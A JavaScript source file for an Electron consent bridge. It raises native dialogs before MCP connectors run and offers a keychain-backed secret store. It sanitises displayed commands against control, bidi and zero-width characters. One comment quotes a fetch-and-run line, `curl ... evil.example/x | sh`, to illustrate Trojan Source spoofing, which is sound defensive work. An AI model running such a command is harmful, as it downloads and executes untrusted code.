'use strict'

/**
 * MCP consent bridge — a loopback HTTP server in the Electron MAIN process that lets the
 * orchestrator ask a human before it runs a third-party program.
 *
 * Why it exists: `/api/` is guarded only by the Origin/Fetch-Metadata check, and that check
 * deliberately admits a request with no Origin so curl and other local clients work. That correctly
 * stops remote pages and DNS rebinding, and it authenticates nothing — every process already on the
 * machine passes it. So the orchestrator cannot be the authority for "spawn this command"; a human
 * looking at a native dialog is. Main owns that dialog, so main owns this decision.
 *
 * The dialog is deliberately ASYNC (`showMessageBox`, not `showMessageBoxSync`): a sync dialog pumps
 * the event loop while blocking main, and this server may have other requests in flight. The
 * re-entrancy guard mirrors confirmQuit's in main.cjs — a native dialog pumps the loop, so a second
 * request can arrive while one is open.
 *
 * Access control mirrors cdp-bridge.cjs exactly: loopback bind + loopback Host check + a per-boot
 * random bearer handed to the spawned orchestrator via env.
 *
 * Env is acceptable HERE, specifically. For `/confirm` this token does not authorize anything: it
 * buys the ability to raise a dialog, and every dialog it raises is one a human reads and can
 * refuse. An attacker holding it can make a confirmation appear that the user did not ask for —
 * which is the defence working, not failing.
 *
 * `/secret` IS different in kind, and an earlier version of this comment said it must not live here
 * at all. That was too strong. It is true that the token gates access to secrets rather than to a
 * prompt — but the only way to read the token is to read the orchestrator's environment, and
 * anything that can do that can equally read the same tokens out of that process's memory, where
 * they lived before this existed. The exposure to a same-user attacker is unchanged.
 *
 * What it does buy is protection AT REST: a stolen disk, a backup, or another account on the
 * machine gets ciphertext under a key held by the OS keychain. That is the threat this is for, and
 * it is why the alternative — a plaintext file of refresh tokens — is the thing not to ship.
 *
 * It is a keyed STORE, never an encrypt/decrypt oracle. Main holds the ciphertext; a caller may ask
 * for a value under a key it is allowed to name, and cannot ask this process to decrypt bytes it
 * supplies. Key names are validated against one narrow shape, so it cannot be used as a general
 * secret store for anything else on the machine.
 *
 * No top-level `require('electron')` — the electron objects are injected so this unit-tests under Bun.
 */

const http = require('node:http')
const crypto = require('node:crypto')

/** Commands and argv can be long; a dialog is not a place for unbounded text. */
const MAX_DISPLAY_CHARS = 4_000
/** Mirrors the funded campaign contract. Overlong procedures are refused, never hidden. */
const MAX_SPONSORED_PROCEDURE_CHARS = 8_000
/** Whole user messages only; Desktop selects the newest suffix within this total. */
const MAX_SPONSORED_TASK_CONTEXT_CHARS = 8_192
const BODY_CAP_BYTES = 64 * 1024

function isLoopbackHost(host) {
  if (!host) return false
  const match = /^(\[[^\]]+\]|[^:]+)(?::(\d+))?$/.exec(host)
  if (!match || (match[2] !== undefined && Number(match[2]) > 65_535))
    return false
  const name = match[1].toLowerCase()
  return name === '127.0.0.1' || name === 'localhost' || name === '[::1]'
}

// Every value this renders is a single labelled line, so anything that can move text off that line
// — or move it around within it — is a way to make the dialog describe something other than what
// will run. Three families, all of which reached the spec box unaltered at some point:
//
//   C0/C1 and the line separators: a newline pushes the real command out of the monospaced box and
//     into the muted prose underneath, where it reads as boilerplate.
//   Bidi controls (U+202A–202E, U+2066–2069) and the marks (U+200E/200F): U+202E reverses the
//     rendered run, so `curl -s https://evil.example/x | sh` can be displayed backwards as
//     something harmless while the real argv is untouched. Trojan Source, aimed at a consent
//     dialog instead of at a code review.
//   Zero-width (U+200B–200D, U+2060, U+FEFF): splits a word invisibly, so `cur<ZWSP>l` reads as
//     `curl` and a name can be made to look like one a user recognises.
//
// Escaped, never stripped: dropping the character hides the payload just as well, only quietly.
const ESCAPES = { '\n': '\\n', '\r': '\\r', '\t': '\\t' }
const UNSAFE_DISPLAY =
  // eslint-disable-next-line no-control-regex
  /[\u0000-\u001f\u007f-\u009f\u061c\u200b-\u200f\u202a-\u202e\u2060-\u2064\u2066-\u206f\u2028\u2029\ufeff]/g
const escapeDisplay = (value) =>
  String(value ?? '').replace(
    UNSAFE_DISPLAY,
    (c) => ESCAPES[c] ?? `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`,
  )
const clamp = (value) => {
  const text = escapeDisplay(value)
  return text.length > MAX_DISPLAY_CHARS
    ? `${text.slice(0, MAX_DISPLAY_CHARS)}…`
    : text
}

/**
 * What the human reads. Env var NAMES only — their values are credentials, and a consent dialog is
 * the last place they should appear.
 */
function describeLaunch(spec) {
  const lines = []
  if (spec && typeof spec.command === 'string') {
    lines.push(`Command:  ${clamp(spec.command)}`)
    const args = Array.isArray(spec.args) ? spec.args : []
    // Quoted individually: joined by spaces, ["-c", "echo hi"] and ["-c", "echo", "hi"] render
    // identically, so a single long argument can be made to read as a familiar flag sequence.
    lines.push(
      `Arguments:  ${args.length ? args.map((a) => `"${clamp(a)}"`).join(' ') : '(none)'}`,
    )
    lines.push(
      `Directory:  ${spec.cwd ? clamp(spec.cwd) : '(your home folder)'}`,
    )
    const names = Array.isArray(spec.envNames) ? spec.envNames : []
    lines.push(
      `Environment:  ${names.length ? clamp(names.join(', ')) : '(none)'}`,
    )
  } else if (isSponsored(spec)) {
    // The exact procedure comes from the authenticated pre-consent read. It
    // must be visible here: retaining only its hash would prevent a changed
    // procedure from being accepted, but would not tell the human what they
    // approved. Folder and branch make the local scope concrete.
    lines.push(`Task:  ${clamp(spec.sponsored.headline)}`)
    // The procedure is length-checked before display. Escape every unsafe
    // source character after that check so an 8,000-character procedure stays
    // complete even when visible escape sequences expand its rendered length.
    lines.push(`Procedure:  ${escapeDisplay(spec.sponsored.procedure)}`)
    spec.sponsored.taskContext.forEach((message, index) => {
      lines.push(`User task ${index + 1}:  ${escapeDisplay(message)}`)
    })
    lines.push(`Folder:  ${clamp(spec.sponsored.folder)}`)
    lines.push(`Branch:  ${clamp(spec.sponsored.branch)}`)
  } else if (spec && typeof spec.url === 'string') {
    lines.push(`Address:  ${clamp(spec.url)}`)
  } else {
    lines.push('(this connector has no runnable command — refusing)')
  }
  return lines.join('\n')
}

/**
 * A sponsored spec is runnable only with a NAME. The sentence is about whoever is asking, and a
 * sentence about nobody asks a human to consent to nothing -- the window refuses that too, but the
 * bridge should never send it.
 */
function isSponsored(spec) {
  return Boolean(
    spec &&
    spec.sponsored &&
    typeof spec.sponsored.advertiser === 'string' &&
    spec.sponsored.advertiser.trim() &&
    typeof spec.sponsored.headline === 'string' &&
    spec.sponsored.headline.trim() &&
    typeof spec.sponsored.procedure === 'string' &&
    spec.sponsored.procedure.trim() &&
    spec.sponsored.procedure.length <= MAX_SPONSORED_PROCEDURE_CHARS &&
    Array.isArray(spec.sponsored.taskContext) &&
    spec.sponsored.taskContext.length > 0 &&
    spec.sponsored.taskContext.length <= 8 &&
    spec.sponsored.taskContext.every(
      (message) => typeof message === 'string' && message.trim(),
    ) &&
    spec.sponsored.taskContext.reduce(
      (total, message) => total + message.length,
      0,
    ) <= MAX_SPONSORED_TASK_CONTEXT_CHARS &&
    typeof spec.sponsored.folder === 'string' &&
    spec.sponsored.folder.trim() &&
    typeof spec.sponsored.branch === 'string' &&
    spec.sponsored.branch.trim(),
  )
}

/**
 * The advertiser's name sits inside the product-owned sentence. `clamp` handles characters that
 * restyle a line in every displayed field; this tighter cap handles the name's length because the
 * general 4,000-character task cap would let it push the buttons below the fold.
 */
const MAX_NAME_CHARS = 80
const clampName = (value) => {
  const text = clamp(value).trim()
  return text.length > MAX_NAME_CHARS
    ? `${text.slice(0, MAX_NAME_CHARS)}…`
    : text
}

/** The identity sentence. The CLI says the same words (`sponsored-proposal-block.tsx`). */
const SPONSORED_SENTENCE =
  ' wants to integrate itself into this project, on its own branch. Nothing is pushed until you review it.'
const sponsoredSentence = (advertiser) =>
  `${clampName(advertiser)}${SPONSORED_SENTENCE}`

function isRunnable(spec) {
  return Boolean(
    spec &&
    (typeof spec.command === 'string' ||
      typeof spec.url === 'string' ||
      isSponsored(spec)),
  )
}

/**
 * The only key shape `/secret` will answer for, and the reason this is a scoped store rather than a
 * general one: a caller cannot name a key outside it, so holding the bridge token does not turn this
 * process into somewhere to stash — or read — anything else on the machine.
 *
 * The id half covers both shapes a server id has taken: the derived 32-hex one, and the uuid that
 * older sidecars minted.
 */
const SECRET_KEY = /^mcp\/[0-9a-f-]{8,64}\/(tokens|client)$/

/** Values are JSON documents of modest size; a cap is cheaper than trusting the caller. */
const MAX_SECRET_BYTES = 16 * 1024

/**
 * @param confirm  injected `dialog.showMessageBox`-shaped function
 * @param getWindow  returns the window to parent the dialog to, or null
 */
/**
 * @param confirm  injected `dialog.showMessageBox`-shaped function
 * @param getWindow  returns the window to parent the dialog to, or null
 * @param secrets  injected keyed store — `{ get, set, delete }`, each taking a validated key.
 *                 Omitted in tests that only exercise consent, and by any host with no keychain,
 *                 in which case `/secret` reports that rather than storing anything in the clear.
 */
function createMcpConsentBridge({ confirm, getWindow, secrets }) {
  const token = crypto.randomUUID()
  // a native dialog pumps the event loop, so a second request can arrive while one is open
  let asking = false

  function readBody(req) {
    return new Promise((resolve, reject) => {
      const chunks = []
      let size = 0
      req.on('data', (chunk) => {
        size += chunk.length
        if (size > BODY_CAP_BYTES) {
          req.destroy()
          reject(
            Object.assign(new Error('body too large'), {
              status: 400,
              kind: 'bad_request',
            }),
          )
          return
        }
        chunks.push(chunk)
      })
      req.on('end', () => resolve(Buffer.concat(chunks).toString('utf8')))
      req.on('error', reject)
    })
  }

  /**
   * Returns `[status, payload]`. Never echoes a value back on a write, and never says whether a key
   * exists except by returning it on an explicit `get` for a key the caller was allowed to name.
   */
  async function handleSecret(body) {
    const bad = (message) => [400, { error: { kind: 'bad_request', message } }]
    const { op, key, value } = body
    // `available()` is resolved lazily by the store, so this request is the first thing that
    // touches the keychain — deliberately not `boot()`, which must not be able to block on it.
    if (!secrets || secrets.available?.() === false) {
      return [
        501,
        {
          error: {
            kind: 'unavailable',
            message: 'this host has no secure storage',
          },
        },
      ]
    }
    if (typeof key !== 'string' || !SECRET_KEY.test(key))
      return bad('key is not in a namespace this bridge serves')

    switch (op) {
      case 'get':
        return [200, { value: (await secrets.get(key)) ?? null }]
      case 'set':
        if (typeof value !== 'string') return bad('set needs a string value')
        if (Buffer.byteLength(value, 'utf8') > MAX_SECRET_BYTES)
          return bad('value is too large')
        await secrets.set(key, value)
        return [200, { ok: true }]
      case 'delete':
        await secrets.delete(key)
        return [200, { ok: true }]
      default:
        return bad('op must be get, set or delete')
    }
  }

  const server = http.createServer(async (req, res) => {
    const respond = (status, payload) => {
      res.writeHead(status, { 'content-type': 'application/json' })
      res.end(JSON.stringify(payload))
    }
    try {
      if (!isLoopbackHost(req.headers.host)) {
        return respond(403, {
          error: { kind: 'bad_request', message: 'forbidden host' },
        })
      }
      if (req.headers.authorization !== `Bearer ${token}`) {
        return respond(401, {
          error: { kind: 'bad_request', message: 'missing or invalid token' },
        })
      }

      const url = new URL(req.url, 'http://127.0.0.1')
      if (req.method === 'GET' && url.pathname === '/healthz')
        return respond(200, { ok: true })

      const isSecret = req.method === 'POST' && url.pathname === '/secret'
      if (!isSecret && (req.method !== 'POST' || url.pathname !== '/confirm')) {
        return respond(400, {
          error: {
            kind: 'bad_request',
            message: `unknown route ${url.pathname}`,
          },
        })
      }

      let body
      try {
        body = JSON.parse(await readBody(req))
      } catch (err) {
        if (err?.status) throw err
        return respond(400, {
          error: { kind: 'bad_request', message: 'invalid JSON body' },
        })
      }

      if (isSecret) return respond(...(await handleSecret(body ?? {})))

      const { name, spec } = body ?? {}
      if (typeof name !== 'string' || !name || !isRunnable(spec)) {
        return respond(400, {
          error: {
            kind: 'bad_request',
            message: 'name and a runnable spec are required',
          },
        })
      }

      // Refusing rather than queueing: a second prompt stacked behind the first is indistinguishable
      // to the user from the one they are already answering, which is how someone approves the wrong
      // thing.
      if (asking) {
        return respond(409, {
          error: {
            kind: 'busy',
            message: 'another connector is awaiting approval',
          },
        })
      }

      asking = true
      try {
        const parent = typeof getWindow === 'function' ? getWindow() : null
        // A remote connector runs nothing here. Telling someone they are about to execute a
        // program when they are about to hand their data to a third party describes the wrong
        // decision, and a consent dialog that describes the wrong decision is not consent.
        const local = typeof spec.command === 'string'
        const sponsored = isSponsored(spec)
        const specText = describeLaunch(spec)
        // Sponsored consent keeps the short product-owned sentence and also
        // displays the exact prepared task and its local folder/branch scope.
        // `sponsored.advertiser` remains separate so the page sets the name as
        // text rather than markup.
        const explanation = sponsored
          ? ''
          : local
            ? 'This runs a program with the same permissions as you. Only continue if you recognise it.\n' +
              'Environment variable names are shown; their values are not.'
            : 'This sends requests to that address, and it may ask you to sign in.\n' +
              'Only continue if you recognise it.'
        const choice = await confirm(parent, {
          type: 'warning',
          buttons: sponsored
            ? ['No', 'Yes']
            : ['Cancel', local ? 'Run it' : 'Connect'],
          defaultId: 0,
          cancelId: 0,
          title: sponsored
            ? 'Run this sponsored task?'
            : local
              ? 'Run this connector?'
              : 'Connect to this server?',
          message: sponsored
            ? sponsoredSentence(spec.sponsored.advertiser)
            : local
              ? `Run "${clamp(name)}" on this computer?`
              : `Let Freebuff connect to "${clamp(name)}"?`,
          // `specText` and `explanation` are what our own window renders, kept apart so it never has
          // to recover the boundary between them from a delimiter inside attacker-supplied text.
          // `detail` is the same content joined, for the OS message box we fall back to -- for the
          // sponsored fallback receives the same prepared task and scope in detail.
          specText,
          explanation,
          detail: sponsored ? specText : `${specText}\n\n${explanation}`,
          ...(sponsored
            ? {
                sponsored: { advertiser: clampName(spec.sponsored.advertiser) },
              }
            : {}),
        })
        const index =
          typeof choice === 'object' && choice ? choice.response : choice
        return respond(200, { approved: index === 1 })
      } finally {
        asking = false
      }
    } catch (err) {
      const status = err?.status ?? 500
      const kind = err?.kind ?? 'bad_request'
      respond(status, { error: { kind, message: err?.message ?? String(err) } })
    }
  })

  return new Promise((resolve, reject) => {
    server.once('error', reject)
    server.listen(0, '127.0.0.1', () => {
      resolve({
        port: server.address().port,
        token,
        close: () => new Promise((done) => server.close(() => done())),
      })
    })
  })
}

module.exports = {
  createMcpConsentBridge,
  isLoopbackHost,
  describeLaunch,
  sponsoredSentence,
  SPONSORED_SENTENCE,
  SECRET_KEY,
}
